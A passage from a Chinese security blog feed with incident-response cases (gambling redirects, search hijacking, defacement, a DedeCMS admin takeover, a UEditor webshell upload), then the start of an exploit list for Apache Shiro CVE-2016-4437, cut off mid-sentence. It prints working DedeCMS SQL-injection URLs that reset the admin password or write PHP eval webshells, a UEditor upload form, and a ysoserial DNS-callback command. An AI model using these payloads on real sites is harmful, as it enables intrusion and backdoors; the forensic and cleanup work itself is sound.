title="现象描述"></a>现象描述</h3><p>部分网站用户反馈，手机打开网站就会跳转到赌博网站。</p><h3 id="问题处理"><a href="#问题处理" class="headerlink" title="问题处理"></a>问题处理</h3><p>访问网站首页，抓取到了一条恶意js： <a href="http://js.zadovosnjppnywuz.com/caonima.js" target="_blank" rel="noopener">http://js.zadovosnjppnywuz.com/caonima.js</a></p><p><img src="/image/5-1.png" srcset="/img/loading.gif" alt=""></p><p>我们可以发现，攻击者通过这段js代码判断手机访问来源，劫持移动端（如手机、ipad、Android等）流量，跳转到<a href="https://262706.com。" target="_blank" rel="noopener">https://262706.com。</a></p><p>进一步访问<a href="https://262706.com，跳转到赌博网站：">https://262706.com，跳转到赌博网站：</a></p><p><img src="/image/5-2.png" srcset="/img/loading.gif" alt=""></p><h2 id="第6篇：搜索引擎劫持"><a href="#第6篇：搜索引擎劫持" class="headerlink" title="第6篇：搜索引擎劫持"></a>第6篇：搜索引擎劫持</h2><p>​    当你直接打开网址访问网站，是正常的，可是当你在搜索引擎结果页中打开网站时，会跳转到一些其他网站，比如博彩，虚假广告，淘宝搜索页面等。是的，你可能了遇到搜索引擎劫持。</p><h3 id="现象描述-4"><a href="#现象描述-4" class="headerlink" title="现象描述"></a>现象描述</h3><p>从搜索引擎来的流量自动跳转到指定的网页</p><h3 id="问题处理-1"><a href="#问题处理-1" class="headerlink" title="问题处理"></a>问题处理</h3><p>通过对index.php文件进行代码分析，发现该文件代码 对来自搜狗和好搜的访问进行流量劫持。</p><p><img src="/image/6-1.png" srcset="/img/loading.gif" alt=""></p><p>进一步跟着include函数包含的文件，index,php包含/tmp/.ICE-unix/.. /c.jpg。</p><p><img src="/image/6-2.png" srcset="/img/loading.gif" alt=""></p><p>进入/tmp目录进行查看，发现该目录下，如c.jpg等文件，包含着一套博彩劫持的程序。</p><p><img src="/image/6-3.png" srcset="/img/loading.gif" alt=""></p><h2 id="第7篇：网站首页被篡改"><a href="#第7篇：网站首页被篡改" class="headerlink" title="第7篇：网站首页被篡改"></a>第7篇：网站首页被篡改</h2><p>​    网站首页被非法篡改，是的，就是你一打开网站就知道自己的网站出现了安全问题，网站程序存在严重的安全漏洞，攻击者通过上传脚本木马，从而对网站内容进行篡改。而这种篡改事件在某些场景下，会被无限放大。</p><h3 id="现象描述-5"><a href="#现象描述-5" class="headerlink" title="现象描述"></a>现象描述</h3><p>网站首页被恶意篡改，比如复制原来的图片，PS一下，然后替换上去。</p><h3 id="问题处理-2"><a href="#问题处理-2" class="headerlink" title="问题处理"></a>问题处理</h3><p>1、<strong>确认篡改时间</strong></p><p>通过对被篡改的图片进行查看，确认图片篡改时间为2018年04月18日 19:24:07 。</p><p><img src="/image/7-1.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>2、访问日志溯源</strong></p><p>通过图片修改的时间节点，发现可疑IP：113.xx.xx.24 （代理IP，无法追溯真实来源），访问image.jsp（脚本木马），并随后访问了被篡改的图片地址。</p><p><img src="/image/7-2.png" srcset="/img/loading.gif" alt=""></p><p>进一步审查所有的日志文件(日志保存时间从2017-04-20至2018-04-19)，发现一共只有两次访问image.jsp文件的记录，分别是2018-04-18和2017-09-21。</p><p><img src="/image/7-3.png" srcset="/img/loading.gif" alt=""></p><p>image.jsp在2017-09-21之前就已经上传到网站服务器，已经潜藏长达半年多甚至更久的时间。</p><p><strong>3、寻找真相</strong></p><p>我们在网站根目录找到了答案，发现站点目录下存在ROOT.rar全站源码备份文件，备份时间为2017-02-28<br>10:35。</p><p><img src="/image/7-4.png" srcset="/img/loading.gif" alt=""></p><p>通过对ROOT.rar解压缩，发现源码中存在的脚本木马与网站访问日志的可疑文件名一致（image.jsp）。</p><p><img src="/image/7-5.png" srcset="/img/loading.gif" alt=""></p><p>根据这几个时间节点，我们尝试去还原攻击者的攻击路径。</p><p>但是我们在访问日志并未找到ROOT.rar的访问下载记录，访问日志只保留了近一年的记录，而这个webshell可能已经存在了多年。</p><p>黑客是如何获取webshell的呢？</p><p>可能是通过下载ROOT.rar全站源码备份文件获取到其中存在的木马信息，或者几年前入侵并潜藏了多年，又或者是从地下黑产购买了shell，我们不得而知。</p><p>本文的示例中攻击者为我们留下了大量的证据和记录，而更多时候，攻击者可能会清除所有的关键信息，这势必会加大调查人员的取证难度。</p><h2 id="第8篇：管理员账号被篡改"><a href="#第8篇：管理员账号被篡改" class="headerlink" title="第8篇：管理员账号被篡改"></a>第8篇：管理员账号被篡改</h2><p>​        你是某一个网站的管理员，有一天，你的管理员账号admin却登录不了，进入数据库查看，原来管理员账号用户名不存在了，却多了另外一个管理员用户名。不对，不是新增了管理员，而是你的管理员用户名被篡改了。</p><h3 id="现象描述-6"><a href="#现象描述-6" class="headerlink" title="现象描述"></a>现象描述</h3><p>前后端分离，后台只允许内网访问，管理员账号admin却依然被多次被篡改</p><h3 id="问题处理-3"><a href="#问题处理-3" class="headerlink" title="问题处理"></a>问题处理</h3><p><strong>1、网站webshell</strong></p><p>在针对网站根目录进行webshell扫描，发现存在脚本木马，创建时间为2018-06-13 04:30:30</p><p><img src="/image/8-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、 定位IP</strong> </p><p>通过木马创建时间， 查看网站访问日志，定位到IP为：180.xx.xx.3</p><p><img src="/image/8-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>3、关联分析</strong></p><p>全局搜索与该IP有关的操作日志：</p><p><img src="/image/8-3.png" srcset="/img/loading.gif" alt=""></p><p>在脚本木马生成前，有两条比较可疑的访问日志吸引了我们的注意：</p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] "GET /plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35 HTTP/1.1" 200 67</code>  </p><p><code>172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] "GET /plus/ad_js.php?aid=19 HTTP/1.1" 200 32</code> </p><p>对这段POC进行解码，我们发现通过这个poc可以往数据库中插入数据，进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><p><img src="/image/8-4.png" srcset="/img/loading.gif" alt=""></p><p>解码后：</p><p>cfg_dbprefixmyad<code>SET</code>normbody<code>= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHERE</code>aid` =19 #  </p><p>综上，可以推测/plus/download.php中可能存在SQL注入漏洞，接下来，收集网上已公开的有以下3种EXP进行漏洞复现。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p><strong>利用方式一：修改后台管理员</strong></p><p>1、新建管理员账号test/test123789，可以成功登录网站后台</p><p>2、构造如下注入SQL语句：</p><p><code>cfg_dbprefixadmin SETuserid='spider',pwd</code>=’f297a57a5a743894a0e4’ where id=19 #`</p><p>修改后台管理员为：用户名spider，密码admin。</p><p>（3）对应的EXP:</p><p><code>？open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code> </p><p>执行EXP后，相应后台数据库表变为如下：</p><p><img src="/image/8-5.png" srcset="/img/loading.gif" alt=""></p><p>（4）因此相应后台登录用户变为spider密码admin</p><p><strong>利用方式二：通过/plus/mytag_js.php文件生成一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p>`cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@',’{dede:php}file_put_contents(‘’90sec.php’’,’’<!--?php eval($_POST[guige]);?-->‘’);{/dede:php}’) # @'``</p><p>（2）对应的EXP:</p><p><code>?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=116&amp;arrs2[]=97&amp;arrs2[]=103&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=40&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=44&amp;arrs2[]=101&amp;arrs2[]=120&amp;arrs2[]=112&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=44&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=86&amp;arrs2[]=65&amp;arrs2[]=76&amp;arrs2[]=85&amp;arrs2[]=69&amp;arrs2[]=83&amp;arrs2[]=40&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=49&amp;arrs2[]=51&amp;arrs2[]=44&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=123&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=57&amp;arrs2[]=48&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=103&amp;arrs2[]=117&amp;arrs2[]=105&amp;arrs2[]=103&amp;arrs2[]=101&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=123&amp;arrs2[]=47&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=58&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=125&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=32&amp;arrs2[]=35&amp;arrs2[]=32&amp;arrs2[]=64&amp;arrs2[]=96&amp;arrs2[]=92&amp;arrs2[]=39&amp;arrs2[]=96</code> </p><p>（3）执行EXP后，将向数据库表dede_mytag中插入一条记录，</p><p><img src="/image/8-6.png" srcset="/img/loading.gif" alt=""></p><p>（4）执行如下语句，在/plus目录下生成90sec.php一句话木马 <a href="http://www.xxxx.com/plus/mytag_js.php?aid=9013" target="_blank" rel="noopener">http://www.xxxx.com/plus/mytag_js.php?aid=9013</a></p><p><strong>利用方式三：使/plus/ad_js.php文件变为一句话木马php</strong></p><p>（1）如：构造如下注入SQL语句：</p><p><code>cfg_dbprefixmyadSETnormbody= '&lt;?php file_put_contents(''read.php'',''&lt;?php eval($_POST[x]);echo mOon;?&gt;'');?&gt;' WHEREaid</code> =19 #`  </p><p>（2）对应的EXP:</p><p><code>/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=109&amp;arrs2[]=121&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=110&amp;arrs2[]=111&amp;arrs2[]=114&amp;arrs2[]=109&amp;arrs2[]=98&amp;arrs2[]=111&amp;arrs2[]=100&amp;arrs2[]=121&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=32&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=102&amp;arrs2[]=105&amp;arrs2[]=108&amp;arrs2[]=101&amp;arrs2[]=95&amp;arrs2[]=112&amp;arrs2[]=117&amp;arrs2[]=116&amp;arrs2[]=95&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=101&amp;arrs2[]=110&amp;arrs2[]=116&amp;arrs2[]=115&amp;arrs2[]=40&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=60&amp;arrs2[]=63&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=32&amp;arrs2[]=101&amp;arrs2[]=118&amp;arrs2[]=97&amp;arrs2[]=108&amp;arrs2[]=40&amp;arrs2[]=36&amp;arrs2[]=95&amp;arrs2[]=80&amp;arrs2[]=79&amp;arrs2[]=83&amp;arrs2[]=84&amp;arrs2[]=91&amp;arrs2[]=120&amp;arrs2[]=93&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=101&amp;arrs2[]=99&amp;arrs2[]=104&amp;arrs2[]=111&amp;arrs2[]=32&amp;arrs2[]=109&amp;arrs2[]=79&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=39&amp;arrs2[]=41&amp;arrs2[]=59&amp;arrs2[]=63&amp;arrs2[]=62&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=87&amp;arrs2[]=72&amp;arrs2[]=69&amp;arrs2[]=82&amp;arrs2[]=69&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=97&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=57&amp;arrs2[]=32&amp;arrs2[]=35</code></p><p>（3）执行EXP后，将向数据库表dede_myad中插入一条记录。</p><p>（4）进一步访问/plus/ad_js.php?aid=19 即可在plus目录生成read.php脚本文件。</p><hr><p>如何清除？</p><p>1、删除网站目录中的webshell</p><p>2、清除dede_myad、dede_mytag数据库表中插入的SQL语句，防止再次被调用生成webshell。</p><p>如何防御？</p><p>网站采用开源CMS搭建，建议及时对官方发布的系统补丁以及内核版本进行升级。</p><h2 id="第9篇：编辑器入侵事件"><a href="#第9篇：编辑器入侵事件" class="headerlink" title="第9篇：编辑器入侵事件"></a>第9篇：编辑器入侵事件</h2><p>UEditor是百度的一个javascript编辑器的开源项目，很多开发人员都喜欢引用这个编辑器，但这个编辑器官网版本一直停留在2016-05-26，已经很久没有更新了。</p><h3 id="0x01-现象描述"><a href="#0x01-现象描述" class="headerlink" title="0x01 现象描述"></a>0x01 现象描述</h3><p>HIDS预警：发现后门(Webshell)文件，建议您立即进行处理。</p><h3 id="0x02-事件分析-5"><a href="#0x02-事件分析-5" class="headerlink" title="0x02 事件分析"></a>0x02 事件分析</h3><p><strong>1、发现Webshell</strong></p><p>通过预警信息，找到木马文件路径：</p><p><img src="/image/9-1.png" srcset="/img/loading.gif" alt=""></p><p>备注：紧急处理，通过禁止动态脚本在上传目录的运行权限，使webshell无法成功执行。</p><p><strong>2、定位文件上传时间</strong></p><p>根据Webshell文件创建时间，2020年3月9日 15:08:34 </p><p><img src="/image/9-2.png" srcset="/img/loading.gif" alt=""></p><p>3、<strong>Web访问日志关联分析</strong></p><p>由于，IIS日志时间与系统时间相差8小时，系统时间是15:08，我们这里查看的是 7:08的日志时间。  </p><pre><code class="hljs routeros">2020-03-09 07:08:34 10.215.2.128 POST /ueditor/net/controller.ashx <span class="hljs-attribute">action</span>=catchimage<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.2020-03-09 07:08:35 10.215.2.128 POST /ueditor/net/controller.ashx <span class="hljs-attribute">action</span>=catchimage</code></pre><p>找到对应的网站访问日志，在文件创建时间隔间里，我们会注意到这样两个ueditor的访问请求，初步怀疑是UEditor编辑器任意文件上传漏洞。</p><p><strong>4、本地漏洞复现</strong></p><p>A、本地构建一个html</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage"</span><span class="hljs-attr">enctype</span>=<span class="hljs-string">"application/x-www-form-urlencoded"</span>  <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>shell addr:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"source[]"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span> &gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">inputtype="submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Submit"</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre><p>B、上传webshell，上传成功</p><p><img src="/image/9-3.png" srcset="/img/loading.gif" alt=""></p><p>经漏洞复现，确认UEditor编辑器任意文件上传漏洞。</p><p><strong>5、还原攻击者行为</strong></p><p>通过相关文件的访问记录进行关联分析，攻击者通过 ueditor编辑器成功上传webshell。</p><h3 id="0x03-事件处理"><a href="#0x03-事件处理" class="headerlink" title="0x03 事件处理"></a>0x03 事件处理</h3><p>1、<strong>删除Webshell</strong></p><p>清楚已发现的webshell，并尝试查找可能隐藏的webshell。</p><p><strong>2、代码完整性验证</strong></p><p>我们来思考一个问题，如果有一个免杀的Webshell隐藏在数以万行的代码中，怎么搞？</p><p>文件完整性校验，检查网站的源码是否被篡改过。</p><p>操作过程：</p><p>通过查看服务器上已部署的源代码版本，找研发同事要同样版本的代码。把纯净源码的所有文件计算一次hash值保存，再到服务器上执行一次hash值，通过比对hash值，输出新创建的/被修改过的/删除的文件列表。</p><p><strong>3、系统入侵排查</strong></p><p>对系统做一个整体排查，确认是否存在后门</p><p><strong>4、代码修复</strong></p><p>反馈给相关开发人员进行代码修复。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>应急响应</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>漏洞利用</title>
    <link href="/2020/07/08/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2020/07/08/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="来自《斗象科技》武器库"><a href="#来自《斗象科技》武器库" class="headerlink" title="来自《斗象科技》武器库"></a>来自《斗象科技》武器库</h2><a id="more"></a><h1 id="第一节"><a href="#第一节" class="headerlink" title="第一节"></a>第一节</h1><h2 id="Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437"><a href="#Apache-Shiro-RememberMe-反序列化导致的命令执行漏洞-Shiro-550-CVE-2016-4437" class="headerlink" title="Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)"></a>Apache Shiro RememberMe 反序列化导致的命令执行漏洞 (Shiro-550, CVE-2016-4437)</h2><p><strong>1. 漏洞简介</strong></p><p>Apache Shiro 是企业常见的Java安全框架, 其漏洞在2019年攻防演练中起到显著作用</p><p><strong>2. 影响组件</strong></p><p>Apache Shiro (由于密钥泄露的问题, 部分高于1.2.4版本的Shiro也会受到影响)</p><p><strong>3. 漏洞指纹</strong></p><p><code>set-Cookie: rememberMe=deleteMe</code><br>或者URL中有shiro字样<br>有一些时候服务器不会主动返回 <code>rememberMe=deleteMe</code>, 直接发包即可</p><p><strong>4. Fofa Dork</strong></p><pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Apache-Shiro"</span></code></pre><p><strong>5. 漏洞分析</strong></p><p>【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞<br><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">https://paper.seebug.org/shiro-rememberme-1-2-4/</a></p><p><strong>6. 漏洞利用</strong></p><p>wyzxxz/shiro_rce: shiro rce 反序列 命令执行 一键工具<br><a href="https://github.com/wyzxxz/shiro_rce" target="_blank" rel="noopener">https://github.com/wyzxxz/shiro_rce</a></p><p>Apache Shiro回显poc改造计划<br><a href="https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-ODg9xL838wro2S_NK30bw</a></p><p><strong>7. 利用技巧</strong></p><p>1.使用多个泄露的key进行遍历, 这个在实战中确实有效</p><p>关于Shiro反序列化漏洞的延伸—升级shiro也能被shell<br><a href="https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw</a></p><p>Shiro 100 Key<br><a href="https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sclSe2hWfhv8RZvQCuI8LA</a></p><p>2.使用 <code>URLDNS</code> 进行检测提速</p><p>使用适应性最强的<code>URLDNS</code>(这个不受JDK版本和安全策略影响, 除非网络限制不能出DNS)进行检测</p><p>且可以使用<code>ysoserial</code>提前生成序列化内容</p><pre><code class="hljs lsl">java -jar target/ysoserial<span class="hljs-number">-0.0</span><span class="hljs-number">.5</span>-SNAPSHOT-all.jar URLDNS <span class="hljs-string">"http://1234567890.test.ceye.io"</span> &gt; urldns.ser</code></pre><p>然后使用<code>占位符+目标url hash</code>的方法修改序列化内容中的<code>urldns</code>地址</p><p>提高检测速度以及后续检测无需使用<code>ysoserial</code></p><p>例如 <code>1234567890.test.ceye.io</code> 可以换成 <code>md5('www.qq.com').hexdigest() [:10].test.ceye.io</code></p><p>也就是 <code>9d2c68d82d.test.ceye.io</code></p><p>可以预先记录 hash</p><pre><code class="hljs css">9<span class="hljs-selector-tag">d2c68d82d</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span></code></pre><p>然后进行hash查表就可以知道是<code>DNSLOG</code>来自哪个目标, 性能会提高不少</p><p>3.已知目标使用了<code>Shiro</code>, 可以采取<code>Shiro-721</code>的报错逻辑来进行遍历<code>key</code> — 星光哥</p><p>这样即使DNS不能出网, 也可以通过是否返回 